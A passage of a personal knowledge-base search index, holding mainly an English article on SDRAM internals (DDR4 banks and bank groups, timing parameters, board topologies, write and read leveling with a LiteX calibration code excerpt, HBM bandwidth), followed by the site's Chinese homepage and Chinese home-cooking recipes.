SDRAM as an example, the following is the structure of the MT40A1G8 chip:</p> <p> </p> Block diagram of MT40A1G8 (Source Micron Datasheet) <p>Each memory array is 65536 x 128 x 64, called a Bank; four Banks form a Bank Group, and there are 4 Bank Groups, so the total capacity is \\(65536 * 128 * 64 * 4 * 4 = 8 \\mathrm{Gb}\\).</p> <p>Specifically, in the 65536 x 128 x 64 specification of each memory array, 65536 represents the number of rows, each row holds \\(128 * 64 = 8192\\) bits of data, and is also the bit width of the transfer between <code>Sense amplifier</code> and <code>I/O gating, DM mask logic</code> in Figure 1. Each row has 1024 columns, and each column holds 8 bits of data (corresponding to the 8 in <code>1 Gig x 8</code>). Since the DDR4 prefetch width is 8n, an access takes out 8 columns of data, or 64 bits. So each row has 128 of 64 bits, which is the source of the 128 x 64 in the 65536 x 128 x 64 above.</p> <p>Each row contains 1024 columns, so the column address requires 10 bits. However, since the Burst Length is 8, the upper 7 bits (corresponding to <code>128 x 64</code> for 128) are used to select 8 columns, while the lower 3 bits determine the transmission order of these columns. This optimization is designed to facilitate cache refill by pre-fetching the required data:</p> <p> </p> DDR4 Burst Type and Column Order (Source JESD9-4D DDR4)"},{"location":"en/hardware/sdram.html#prefetch","title":"Prefetch","text":"<p>SDRAM has the concept of prefetch, which is how many times the bit width of the data is fetched out in one read. For example, the <code>1 Gig x 8</code> SDRAM above has an I/O data bit width of 8 bits (see the <code>DQ</code> signal on the right). This is because the IO frequency of DDR4 SDRAM is very high, e.g. 3200 MT/s corresponds to an I/O clock frequency of 1600 MHz, while the actual memory array frequency is not as high. The actual memory array frequency is that high, but operates at 400 MHz, so to make up for the difference in frequency, the data is read 8 times the bit width at a time. This is reflected in the I/O, which is a single read operation to get 8 copies of data, i.e. burst length of 8, which is transferred in four clock cycles via DDR.</p> <p>Interestingly, DDR4 memory modules are 64 bits wide, so a single read operation yields \\(64 * 8 / 8 = 64B\\) of data, which is exactly the size of the CPU cache lines.</p> <p>DDR5 increases the prefetch to 16n, which is why you see much larger data rate numbers for DDR5: DDR4 prefetch is 8n, DDR5 prefetch is 16n at the same memory array frequency, so the I/O frequency is doubled and the data rate is doubled. At the same time, in order to maintain the burst size of 64 bytes, the bit width of each channel in DDR5 module is 32 bits, each memory module provides two channels.</p>"},{"location":"en/hardware/sdram.html#access-patterns","title":"Access Patterns","text":"<p>SDRAM has a special access pattern in that its memory array can only be accessed in complete rows at a time. In the previous example, a row has 8192 bits of data, but a read or write operation involves only 64 bits of data, so a read operation requires:</p> <ol> <li>the first step is to retrieve the entire row where the data is located</li> <li>in the second step, read the desired data in the row</li> </ol> <p>But each bank can only take out one row at a time, so if the two reads involve different rows, then you need to:</p> <ol> <li>the first step is to take out the whole row where the data of the first read is located</li> <li>in the second step, read the desired data in the row</li> <li>step 3, put the first read row back</li> <li>step 4, take out the whole row where the data of the second read is located</li> <li>step 5, read the desired data in the row</li> </ol> <p>In SDRAM terms, the first and fourth steps are called Activate, the second and fifth steps are called Read, and the third step is called Precharge.</p> <p>SDRAM defines the following timing parameters that describe the timing requirements between these three operations:</p> <ol> <li>CL (CAS Latency): the time between sending a read request and outputting the first data</li> <li>RCD (ACT to internal read or write delay time): the time from Activate to the next read or write request</li> <li>RP (RRE command period): the time between sending a Precharge command and the next command</li> <li>RAS (ACT to PRE command period): the time between Activate and Precharge</li> <li>RC (ACT to ACT or REF command period): the time between Activate and the next Activate or Refresh</li> <li>RTP (Internal READ Command to PRECHARGE command delay): the time between Read and Precharge</li> </ol> <p>So the above process requires the following time requirements:</p> <ol> <li>the first step, Activate, take out the first row</li> <li>the second step, Read, the time between the first and second steps should be separated by RCD, and the time to wait for CL from Read to send address to get data</li> <li>step 3, Precharge, the time between step 1 and step 3 should be separated by RAS, and the time between step 2 and step 3 should be separated by RTP</li> <li>step 4, Activate, take out the second row, the time between step 1 and step 4 should be separated by RC, and the time between step 3 and step 4 should be separated by RP</li> <li>step 5, Read, the time between step 4 and step 5 should be separated by RCD, the time to wait for CL from Read to send address to get data</li> </ol> <p>Based on this process, the following conclusions can be drawn:</p> <ol> <li>accessing data with locality will have better performance, requiring only continuous Read, reducing the number of activates and precharges</li> <li>constantly accessing data from different rows will lead to a back and forth Activate, Read, Precharge cycle</li> <li>accessing the row and accessing the data in the row are divided into two phases, and both phases can use the same address signals, making the total memory capacity large</li> <li>if the access always hits the same row, the transfer rate can be close to the theoretical one, as shown in Figure 2</li> </ol> <p> </p> DDR3 Sequential Reads within the Same Row (Source JESD9-3F DDR3) <p>To alleviate the performance loss caused by the second point, the concept of Bank is introduced: each Bank can take out a row, so if you want to access the data in different Banks, while the first Bank is doing Activate/Precharge, the other Banks can do other operations, thus covering the performance loss caused by row misses.</p>"},{"location":"en/hardware/sdram.html#bank-group","title":"Bank Group","text":"<p>DDR4 introduces the concept of Bank Group compared to DDR3. Quoting Is the time of page hit in the same bank group tccd_S or tccd_L?, memory array frequency is increased compared to DDR3, so a perfect sequential read cannot be achieved within the same row, i.e. two adjacent read operations need to be separated by 5 cycles, while each read transfers 4 cycles of data with a maximum utilization of 80%, see the following figure:</p> <p> </p> DDR4 Nonconsecutive Reads (Source JESD9-4D DDR4) <p>In order to solve this bottleneck, the difference of DDR4 in the core part is that there is an additional <code>Global I/O gating</code>, and each Bank Group has its own <code>I/O gating, DM mask logic</code>, the following draws the storage part of DDR3 and DDR4 respectively, for comparison:</p> <p> </p> DDR3 SDRAM Storage Part (Source Micron Datasheet) <p> </p> DDR4 SDRAM Storage Part (Source Micron Datasheet) <p>This means that DDR4 can have multiple Bank Groups reading at the same time and pipelining the output. For example, if the first Bank Group reads the data and finishes transferring it in four cycles on the I/O, immediately the second Bank Group read picks up and transfers another four cycles of data, with the following waveform:</p> <p> </p> DDR4 Consecutive Reads from Different Banks (Source JESD9-4D DDR4) <p>In the above figure, the first read request is initiated at time T0, the second request is initiated at time T4, T11-T15 get the data of the first request, followed by T15-T19 get the data of the second request. This solves the problem caused by the increased frequency.</p>"},{"location":"en/hardware/sdram.html#storage-hierarchy","title":"Storage Hierarchy","text":"<p>As mentioned above, the hierarchy within DDR SDRAM, from largest to smallest, is as follows</p> <ol> <li>Bank Group: introduced in DDR4</li> <li>Bank: Each Bank has only one Row activated at the same time</li> <li>Row: Activate/Precharge unit</li> <li>Column: each Column holds n cells, n is the bit width of SDRAM</li> <li>Cell: each cell holds 1 bit of data</li> </ol> <p>In fact, there are several layers outside the SDRAM:</p> <ol> <li>Channel: the number of channels of the processor's memory controller</li> <li>Module: there can be multiple memory sticks connected to the same Channel</li> <li>Rank: multiple DDR SDRAM chips are stitched together in width, one to four Ranks can be put down on a Module. these Ranks share the bus, each Rank has its own chip select signal CS_n, which is actually stitching SDRAM chips in depth</li> <li>Chip: A DDR SDRAM chip; such as a 64-bit wide Rank, is made by using 8 x8 chips stitched together across the width</li> </ol> <p>As you can see, adjacent memory levels differ by a power of two, so the mapping from the memory address to these levels is an interception of different intervals in the address, each corresponding to a subscript of the level. This is why the MB and GB units of memory size are 1024-based.</p> <p>If you study SDRAM memory controllers, such as MIG on Xilinx FPGA, one can find that it can be configured with different address mapping methods, e.g:</p> <ul> <li>ROW_COLUMN_BANK</li> <li>ROW_BANK_COLUMN</li> <li>BANK_ROW_COLUMN</li> <li>ROW_COLUMN_LRANK_BANK</li> <li>ROW_LRANK_COLUMN_BANK</li> <li>ROW_COLUMN_BANK_INTLV</li> </ul> <p>As you can imagine, different address mapping methods will have different performance for different access modes. For sequential memory accesses, the ROW_COLUMN_BANK method is more suitable, because sequential accesses are distributed to different banks, so the performance will be better.</p>"},{"location":"en/hardware/sdram.html#timing-parameters","title":"Timing Parameters","text":"<p>Below are the main timing parameters for DDR4:</p> <ul> <li>tCCD_S: CAS to CAS delay short, the delay between CAS commands to different Bank Groups, e.g., 4 cycles.</li> <li>tCCD_L: CAS to CAS delay long, the delay between CAS commands to the same Bank Group, e.g., 6 cycles.</li> <li>tRRD_S: ACT to ACT delay short, the delay between ACTIVATE commands to different Bank Groups, e.g., 4 cycles.</li> <li>tRRD_L: ACT to ACT delay long, the delay between ACTIVATE commands to the same Bank Group, e.g., 6 cycles.</li> <li>tWTR_S: Write to Read short, the delay from the completion of a WRITE (last data written) to a READ command to a different Bank Group.</li> <li>tWTR_L: Write to Read long, the delay from the completion of a WRITE (last data written) to a READ command to the same Bank Group.</li> <li>tREFI: Refresh Interval, the interval at which the memory controller needs to send REFRESH commands.</li> <li>tRFC: Refresh Cycle, the minimum interval between two REFRESH commands.</li> <li>tFAW: Four Activate Window, the maximum number of ACTIVATE commands that can be sent within a continuous tFAW period. In other words, the i-th ACTIVATE and the (i+4)-th ACTIVATE must be at least tFAW apart.</li> <li>tRP: Precharge, the delay from sending a PRECHARGE command to the next command to the same Bank.</li> <li>tRTP: Read to Precharge, the minimum interval between a READ and a PRECHARGE command to the same Bank.</li> <li>tRAS: RAS active time, the minimum interval between an ACTIVATE and a PRECHARGE command to the same Bank.</li> <li>tRCD: Activate to Read/Write delay, the minimum interval between an ACTIVATE and a READ/WRITE command to the same Bank.</li> <li>tRC: Activate to Activate/Precharge delay, the minimum interval between an ACTIVATE and the next ACTIVATE/PRECHARGE command to the same Bank.</li> <li>CL: CAS Latency, used to calculate Read Latency.</li> <li>CWL: CAS Write Latency, used to calculate Write Latency.</li> <li>AL: Additive Latency, used to calculate Read Latency.</li> <li>RL: Read Latency.</li> <li>WL: Write Latency.</li> </ul> <p>Additive Latency may seem like an artificial increase in command delay, but in reality, the memory controller also sends commands AL cycles in advance. For example, after setting AL, ACT and READ commands can be sent consecutively, with the READ command delayed by AL to meet the tRCD timing requirement, while freeing up the command bus.</p>"},{"location":"en/hardware/sdram.html#interface","title":"Interface","text":"<p>The following pins are drawn for DDR3 and DDR4:</p> <p> </p> DDR3 and DDR4 Schematics <p>The differences between DDR3 and DDR4:</p> <ol> <li>address signal: DDR3 has A0-A14, DDR4 has A0-A17, where A14-A16 are multiplexed pins</li> <li>DDR4 introduces Bank Group, so there are extra pins BA0-BA1.</li> <li>RAS_n, CAS_n and WE_n in DDR3 are reused as A14-A16 in DDR4</li> <li>DDR4 adds an additional ACT_n control signal</li> </ol>"},{"location":"en/hardware/sdram.html#topology","title":"Topology","text":"<p>In order to obtain a larger bit width, many SDRAM chips can be seen on the memory modules, which are stitched together by width to form a 64-bit data width. At this point, from the PCB alignment point of view, the data lines are directly connected to each SDRAM chip and can be connected relatively easily; however, other signals, such as address and control signals, need to be connected to all SDRAM chips, and it is difficult to ensure equal distances to each SDRAM chip while ensuring signal integrity in the confined space.</p>"},{"location":"en/hardware/sdram.html#fly-by-topology","title":"Fly-by topology","text":"<p>Therefore, the address and control signals are actually connected in series (Fly-by-topology), which is the connection on the right in the following figure:</p> <p> </p> Two types of signal connections for SDRAM (Source Versal ACAP PCB Design User Guide (UG863)) <p>But the data signals (DQ, DQS and DM) are still connected point-to-point to the SDRAM in parallel (left side of the figure above). This presents a problem: with different SDRAM chips, the data and clock deviations are different, and the data may arrive at about the same time, but the clock has an increasing delay:</p> <p> </p> SDRAM Clock Skewing Problem <p>In order for SDRAMs at different locations to see the same waveform, a variable delay needs to be added to the data signal on the memory controller side, and this delay needs to be calibrated to know what it is.</p>"},{"location":"en/hardware/sdram.html#clam-shell-topology","title":"Clam-shell topology","text":"<p>In addition to Fly-by topology, Clam-shell topology may be used in some scenarios to save PCB area. Clam-shell is actually a visual representation of having SDRAM chips on both the front and back sides of the PCB:</p> <p> </p> Clam-shell Topology (Source Versal ACAP Programmable Network on Chip and Integrated Memory Controller LogiCORE IP Product Guide (PG313) ) <p>This design makes use of the space on the back of the PCB, but it also brings new problems: intuitively, if both chips are placed on the front of the PCB, it is easier to connect them if the pin order is close to the same, and there will not be many crossings. However, if one is on the front and the other on the back, the pin order is reversed and it is more difficult to connect.</p> <p>The solution is to modify the order of the pins and swap the functions of some pins to make the alignment simpler:</p> <p> </p> SDRAM Pin Mirroring (SourceVersal ACAP PCB Design User Guide (UG863)) <p>The table deliberately selects pins to swap that do not affect special functions, making most functions, even with swapped pins, work properly. For example, if the Row address is swapped by a few bits, it does not affect reading or writing data, although the physical storage place is changed. However, for Mode Register Set operations, the memory controller must swap the order of the bits itself and swap them back when connecting on the PCB to ensure the correct result on the SDRAM side.</p> <p>In addition, Clam-shell Topology has one cs_n chip select signal on the front and one on the back, but this is different from Dual Rank: Dual Rank has the same number of DRAM chips on both front and back, sharing the address, data and control signals, and only one side of the DRAM chips on the bus is in use at the same time, which has the advantage of doubling the memory capacity. The advantage is that the memory capacity is doubled and the two ranks can mask each other's latency; while the two cs_n of Clam Shell Topology are designed to assign either front or back side to Mode Register Set operations, while most of the rest of the operations can work on both front and back sides at the same time because their data signals are not shared.</p>"},{"location":"en/hardware/sdram.html#calibration","title":"Calibration","text":"<p>SDRAM calibration, or SDRAM training, mainly consists of the following steps:</p> <ol> <li>Write Leveling</li> <li>Read Leveling</li> </ol>"},{"location":"en/hardware/sdram.html#write-leveling","title":"Write Leveling","text":"<p>Write Leveling addresses the problem of inconsistent latency caused by Fly-by-Topology, which causes SDRAM to see the wrong signal. Specifically, the purpose of Write Leveling is to synchronize the DQS signal received by the SDRAM chip with the CK signal:</p> <p> </p> DQS and CK synchronization to be achieved by Write Leveling <p>To achieve this, the idea is to continuously adjust the delay of the DQS output, observe the behavior at different delays, and find a delay value that synchronizes the DQS with the CK. In order to do Write Leveling with the memory controller, the SDRAM can enter a Write Leveling Mode, where the SDRAM samples the CK on the rising edge of the DQS and then outputs the result to the DQ. In this case, different DQS delays will result in different results:</p> <p> </p> Results of DQS sampling of CK with different DQS delays <p>In the above figure, for both delay0 and delay1, DQS samples the negative half-cycle of CK, while for delay2 and delay3, DQS samples the positive half-cycle of CK, so if you want to synchronize DQS with CK, you should set the DQS delay between delay1 and delay2.</p> <p>To summarize the Write Leveling algorithm:</p> <ol> <li>Set the SDRAM to Write Leveling mode, where the SDRAM will use DQS for CK and output the result to DQ</li> <li>The controller enumerates the latency of DQS, reads out the DQ results for each DQS latency, and gets a 0-1 string, for example: <code>00111111111111111111110000</code>, that is, as the latency increases, it samples to 0, then to 1, and finally to 0 again</li> <li>find a DQS delay that causes the DQ to change from 0 to 1, then the DQS will be synchronized with the CK according to this delayed output</li> <li>Set the SDRAM to end Write Leveling mode</li> </ol> <p>This process is performed separately for each DQS signal. The following is an example of litex's SDRAM calibration code to implement a simplified process in C code:</p> int sdram_write_leveling_scan(int *delays, int loops, int show)<pre><code>/* Turn on the Write Leveling mode of SDRAM */\nsdram_write_leveling_on();\n\n/* Loop each SDRAM module */\nfor(i=0;i&lt;SDRAM_PHY_MODULES;i++) {\n  /* Loop each DQS signal */\n  for (dq_line = 0; dq_line &lt; DQ_COUNT; dq_line++) {\n    /* Set initial DQS delay to 0 */\n    sdram_leveling_action(i, dq_line, write_rst_delay);\n\n    /* Loop each DQS delay */\n    for(j=0;j&lt;err_ddrphy_wdly;j++) {\n      int zero_count = 0;\n      int one_count = 0;\n\n      /* Sample in loop */\n      for (k=0; k&lt;loops; k++) {\n        /* Send DQS pulse\uff1a00000001 */\n        /* SDRAM sample CK */\n        ddrphy_wlevel_strobe_write(1);\n\n        cdelay(100);\n        /* Read DQ from memory controller */\n        csr_rd_buf_uint8(sdram_dfii_pix_rddata_addr(0), buf, DFII_PIX_DATA_BYTES);\n\n        /* Count the number of 1's and 0's */\n        if (buf[SDRAM_PHY_MODULES-1-i] != 0)\n          one_count++;\n        else\n          zero_count++;\n      }\n      if (one_count &gt; zero_count)\n        /* Consider that DQS samples the positive half-cycle of CK */\n        taps_scan[j] = 1;\n      else\n        /* Consider that DQS samples the negative half-cycle of CK */\n        taps_scan[j] = 0;\n\n      /* Increases the DQS delay  */\n      sdram_leveling_action(i, dq_line, write_inc_delay);\n    }\n\n    /* Find the longest sequence of consecutive 1's */\n    one_window_active = 0;\n    one_window_start = 0;\n    one_window_count = 0;\n    one_window_best_start = 0;\n    one_window_best_count = -1;\n    for(j=0;j&lt;err_ddrphy_wdly+1;j++) {\n      if (one_window_active) {\n        if ((j == err_ddrphy_wdly) || (taps_scan[j] == 0)) {\n          /* Ended a continuous sequence of 1's */\n          one_window_active = 0;\n          one_window_count = j - one_window_start;\n          /* Record the length and position of the longest consecutive 1's */\n          if (one_window_count &gt; one_window_best_count) {\n            one_window_best_start = one_window_start;\n            one_window_best_count = one_window_count;\n          }\n        }\n      } else {\n        /* Find the beginning of consecutive 1's */\n        if (j != err_ddrphy_wdly &amp;&amp; taps_scan[j]) {\n          one_window_active = 1;\n          one_window_start = j;\n        }\n      }\n    }\n\n    /* The delay to be found is the start of a consecutive sequence of 1's */\n    delays[i] = one_window_best_start;\n  }\n}\n\n/* Turn off the Write Leveling mode of SDRAM */\nsdram_write_leveling_off();\n</code></pre>"},{"location":"en/hardware/sdram.html#read-leveling","title":"Read Leveling","text":"<p>In the Write Leveling stage, the synchronization of signals at SDRAM is solved. However, for read operations, data is sent from SDRAM to the controller, and the time of arrival of different data to the controller may be different, so it is also necessary to calibrate the read operation.</p> <p>To determine if the read data is correct, the practice is to first write known data and then read it out. If the read data is exactly the same as the written data, then the read operation can be performed correctly.</p> <p>The implementation is similar to Write Leveling in that it enumerates the delays, performs some operations, and observes the output at each delay:</p> <ol> <li>write data (or use SDRAM's function of generating a fixed pattern output)</li> <li>set the latency to loop from 0</li> <li>at each latency setting, read out the data and compare the read results with the previously written data</li> <li>count which delay conditions, the read data is accurate. accurate is recorded as 1, inaccurate is recorded as 0</li> <li>find the accurate range of 1, and take the midpoint as the final calibration result</li> </ol> <p>Note that here is no longer to find the place of 0-1 change. Write Leveling to find 0-1 change is to synchronize, synchronization is exactly the place of 0-1 change; while the purpose of Read Leveling is to read out the correct data. It is known that there is a continuous delay interval, where it can read out the correct data. Even if the interval is shifted due to changes in temperature and other conditions, it will still work because enough margin is retained by taking the midpoint of the interval. The step of taking the midpoint is also called Read Centering.</p>"},{"location":"en/hardware/sdram.html#hbm","title":"HBM","text":"<p>HBM is short for High Bandwidth Memory, and its technology is also based on SDRAM, so it is placed here for comparison with DDR SDRAM.</p> <p>HBM stacks multiple SDRAMs, provides multiple channels and increases the bit width compared to the pDDR SDRAM. For example Micron HBM with ECC, stacks 4/8 layers of DRAM, provides 8 channels, each with a 128-bit data width. At 3200 MT/s, the maximum data transfer rate of an HBM chip is:</p> \\[ 3200 \\mathrm{(MT/s)} * 128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 3276.8 \\mathrm{(Gb/s)} = 409.6 \\mathrm{(GB/s)} \\] <p>So a single HBM has the transfer rate of 16 traditional DDR SDRAMs, thanks to 8 channels and double the bit width. Each channel has a bit width of 128 bits, so it can be thought of as two 64-bit SDRAMs in parallel, either as one 128-bit SDRAM or, in Pseudo Channel mode, as two SDRAMs that share address and command signals.</p> <p>Of course, the high bandwidth of HBM comes at the cost of a large number of pins. According to the HBM3 JESD238A standard, each channel requires 120 pins, for a total of 16 channels (HBM2 has 8 channels, 128 bits per channel; HBM3 has 16 channels, 64 bits per channel), plus the remaining 52 pins, which adds up to 1972 pins. So the connection to the processor is generally made on the Silicon Interposer, rather than the traditional PCB routing:</p> <p> </p> HBM Packaging (Source A 1.2V 20nm 307GB/s HBM DRAM with At-Speed Wafer-Level I/O Test Scheme and Adaptive Refresh Considering Temperature Distribution) <p>So in the HBM3 standard, the pin is described as a microbump. HBM can be understood figuratively as taking the memory modules that were originally inserted into the motherboard and disassembling them, keeping only the chips, stacking them vertically and turning them into an HBM Die, which is then tightly connected to the CPU. But on the other hand, the density goes up, and the price gets more expensive. The scalability also went down, as you couldn't place as many HBM dies on the motherboard as you could with DDR SDRAM.</p> <p>The following is an analysis of the memory bandwidth of some typical systems with HBM:</p> <p>Xilinx's Virtex Ultrascale Plus HBM FPGA provides a bandwidth of \\(1800 \\mathrm{(MT/s)} * 128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 230.4 \\mathrm{(GB/s)}\\). If two HBMs are used, that's 460.8 GB/s. Exposed to the FPGA logic are 16 256-bit AXI3 ports with an AXI frequency of 450 MHz and a memory frequency of 900 MHz. As you can see, each AXI3 corresponds to a pseudo channel of HBM. Each pseudo channel is 64 bits, but the AXI port is 256 bits. This is because going from 450MHz to 900MHz at the same rate, plus DDR, equates to a quadrupling of the frequency, so the bit width has to be quadrupled from 64 bits to 256 bits accordingly.</p> <p>The 40GB PCIe version of the A100 graphics card uses five 8 GBs of HBM memory running at 1215 MHz, so the memory bandwidth is \\(1215 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/ transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1555 \\mathrm{(GB/s)}\\), which matches the Datasheet. The Memory bus width in the A100 Datasheet is actually calculated by adding up all the channel bit widths: \\(128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(channels)} * 5 \\mathrm{(stacks)} = 5120 \\mathrm{(bits)}\\).</p> <p>The 80GB PCIe version of the A100 graphics card upgrades HBM2 to HBM2e, and the memory clock frequency is upgraded to 1512 MHz, so the memory bandwidth is \\(1512 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{( bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1935 \\mathrm{(GB/s)}\\), which coincides with Datasheet.</p> <p>The 80GB SXM5 version of the H100 graphics card upgrades HBM to HBM3, and the memory capacity remains the same at 80GB, but the clock frequency is increased to 2619 MHz, at which point the memory bandwidth is \\(2619 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\ mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 3352 \\mathrm{(GB/s)}\\).</p>"},{"location":"en/hardware/sdram.html#dram-cell","title":"DRAM Cell","text":"<p>Data in DRAM is stored in capacitors. The internal structure of a typical 1T DRAM Cell is as follows:</p> <p> </p> 1T DRAM Cell Internal Structure (Source Berkeley EECS 151/251A Spring 2019)"},{"location":"en/hardware/sdram.html#comparison-of-ddr-variants","title":"Comparison of DDR variants","text":"<p>A comparison of DDR, LPDDR, GDDR and HBM is given below:</p> DDR4 DDR5 LPDDR4 LPDDR5 GDDR5 GDDR6 HBM2 Channels 1 2 2 2 2 2 8 Bits per Channel 64 32 16 16/32 16 16 128 Data rate (MT/s) 3200 5600 4266 6400 9000 24000 2400 Bandwidth (GB/s) 25.6 GB/s 44.8 GB/s 17.1 GB/s 25.6 GB/s 36 GB/s 96 GB/s 307 GB/s <p>Data rates are based on the highest performance available:</p> <ul> <li>DDR4: Micron 3200 MT/s</li> <li>DDR5: Micron 5600 MT/s</li> <li>LPDDR4: Samsung 4266 MT/s</li> <li>LPDDR5: Samsung 6400 MT/s</li> <li>GDDR5: Samsung 9000 MT/s</li> <li>GDDR6: Samsung 24000 MT/s</li> <li>HBM2: Samsung 2400 MT/s</li> <li>HBM2E: Micron 3200 MT/s</li> </ul>"},{"location":"en/hardware/sdram.html#udimmrdimmlrdimm","title":"UDIMM/RDIMM/LRDIMM","text":"<p>Specifically for DIMMs, there are different types:</p> <ul> <li>UDIMM (Unbuffered DIMM): No additional register buffering</li> <li>RDIMM (Registered DIMM): Register buffering for address, command, and clock signals, but not for data signals</li> <li>LRDIMM (Load Reduced DIMM): Based on RDIMM, it also adds register buffering for data signals</li> </ul> <p>As the number of registers increases, latency also increases, but it allows for higher frequencies and greater capacity.</p>"},{"location":"en/hardware/sdram.html#ddr5-dfe","title":"DDR5 DFE","text":"<p>DDR5 introduces DFE (Decision Feedback Equalization) to enhance signal integrity. For details about DFE, refer to the introduction in Signal Processing.</p> <p>DDR5 supports a 4-Tap DFE, meaning it accounts for interference caused by the four most recent symbols on the current symbol, corresponding to four coefficients. To measure these four coefficients, during training, a pulse is first transmitted, and its response is observed. By continuously adjusting the coefficients, the interference imposed on subsequent symbols is mitigated.</p> <p> </p> DDR5 DFE (Source Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory) <p> </p> DDR5 DFE (Source Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory)"},{"location":"en/hardware/sdram.html#related-reading","title":"Related Reading","text":"<ul> <li>DDR4 Bank Groups in Embedded Applications</li> <li>DDR4 Tutorial - Understanding the Basics</li> <li>DDR5/4/3/2: How Memory Density and Speed Increased with each Generation of DDR</li> <li>DDR5 vs DDR4 DRAM \u2013 All the Advantages &amp; Design Challenges</li> <li>Understanding DDR3 Write Leveling and Read Leveling</li> <li>Will HBM replace DDR and become Computer Memory?</li> </ul>"},{"location":"en/hardware/sdram.html#acknowledgement","title":"Acknowledgement","text":"<p>The English version is kindly translated with the help of DeepL Translator and DeepSeek.</p>"},{"location":"index.html","title":"\u4e3b\u9875","text":"<p>\u200b\u8fd9\u91cc\u200b\u662f\u200b\u6770\u54e5\u200b\u7684\u200b\u77e5\u8bc6\u5e93\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0a\u65b9\u200b\u7684\u200b\u83dc\u5355\u200b\u4e2d\u200b\u5bfb\u627e\u200b\u4f60\u200b\u60f3\u8981\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"cooking/bocaichaojidan.html","title":"\u83e0\u83dc\u200b\u7092\u9e21\u86cb","text":""},{"location":"cooking/bocaichaojidan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u83e0\u83dc\u200b \u200b\u9e21\u86cb\u200b</p>"},{"location":"cooking/bocaichaojidan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u83e0\u83dc\u200b\u6d17\u51c0\u200b \u200b\u76d0\u200b\u6c34\u6ce1\u200b\u4e00\u6bb5\u65f6\u95f4\u200b</li> <li>\u200b\u53ef\u200b\u9009\u200b\u83e0\u83dc\u200b\u5207\u6839\u200b</li> <li>\u200b\u9505\u4e2d\u200b\u628a\u200b\u6c34\u200b\u70e7\u5f00\u200b\uff0c\u200b\u4e0b\u76d0\u200b\u548c\u200b\u6cb9\u200b\uff0c\u200b\u4e0b\u200b\u83e0\u83dc\u200b\uff0c\u200b\u712f\u200b\u6c34\u5230\u200b\u6bb5\u751f\u200b</li> <li>\u200b\u628a\u200b\u83e0\u83dc\u200b\u53d6\u51fa\u200b\u653e\u5230\u200b\u51b7\u6c34\u200b\uff0c\u200b\u8fc7\u51b7\u200b\u6cb3\u200b</li> <li>\u200b\u7528\u200b\u53a8\u623f\u200b\u7eb8\u5438\u200b\u53bb\u200b\u83e0\u83dc\u200b\u4e0a\u200b\u7684\u200b\u6c34\u200b\uff0c\u200b\u5207\u6210\u200b 2cm \u200b\u7684\u200b\u6bb5\u200b</li> <li>\u200b\u628a\u200b\u83e0\u83dc\u200b\u653e\u5230\u200b\u6253\u597d\u200b\u7684\u200b\u86cb\u6db2\u200b\u4e2d\u200b\u6405\u62cc\u200b\uff1b\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u6405\u62cc\u200b\uff0c\u200b\u628a\u200b\u9e21\u86cb\u200b\u7092\u200b\u597d\u200b\u4ee5\u540e\u200b\u548c\u200b\u83e0\u83dc\u200b\u6df7\u5408\u200b</li> <li>\u200b\u70ed\u9505\u200b\u51b7\u6cb9\u200b\uff0c\u200b\u628a\u200b\u83e0\u83dc\u200b\u548c\u200b\u86cb\u6db2\u200b\u4e0b\u9505\u200b</li> </ol>"},{"location":"cooking/bocaichaojidan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-03: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u9e21\u86cb\u200b\u4e0b\u200b\u7684\u200b\u5c11\u200b\u4e86\u200b\u70b9\u200b\uff0c\u200b\u505a\u200b\u5b8c\u200b\u4ee5\u540e\u200b\u90fd\u200b\u770b\u4e0d\u89c1\u200b\u4e86\u200b\uff0c\u200b\u6ce8\u610f\u200b\u6bd4\u4f8b\u200b</li> </ul>"},{"location":"cooking/bocaichaojidan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u53a8\u5e08\u957f\u200b\u6559\u200b\u4f60\u200b\uff1a\u201c\u200b\u9e2d\u86cb\u200b\u7092\u200b\u83e0\u83dc\u200b\u201d\u200b\u7684\u200b\u5bb6\u5e38\u200b\u505a\u6cd5\u200b\uff0c\u200b\u5e94\u5b63\u200b\u7684\u200b\u5feb\u200b\u624b\u83dc\u200b\uff0c\u200b\u6536\u85cf\u200b\u4e86\u200b</li> <li>\u200b\u4e00\u628a\u200b\u83e0\u83dc\u200b\u4e09\u4e2a\u200b\u9e21\u86cb\u200b\uff0c\u200b\u50cf\u200b\u6211\u200b\u8fd9\u6837\u200b\u7b80\u5355\u200b\u4e00\u505a\u200b\uff0c\u200b\u6bd4\u200b\u5927\u9c7c\u5927\u8089\u200b\u8fd8\u200b\u597d\u5403\u200b</li> </ul>"},{"location":"cooking/chaoqincai.html","title":"\u7092\u200b\u82b9\u83dc","text":""},{"location":"cooking/chaoqincai.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u82b9\u83dc\u200b</p>"},{"location":"cooking/chaoqincai.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u53bb\u6389\u200b\u53f6\u5b50\u200b\u548c\u200b\u6839\u200b\uff0c\u200b\u6495\u6389\u200b\u82b9\u83dc\u200b\u7684\u200b\u7b4b\u200b\uff0c\u200b\u5207\u200b\u83f1\u5f62\u200b\u5757\u200b\uff0c\u200b\u4e0d\u8981\u200b\u592a\u539a\u200b</li> 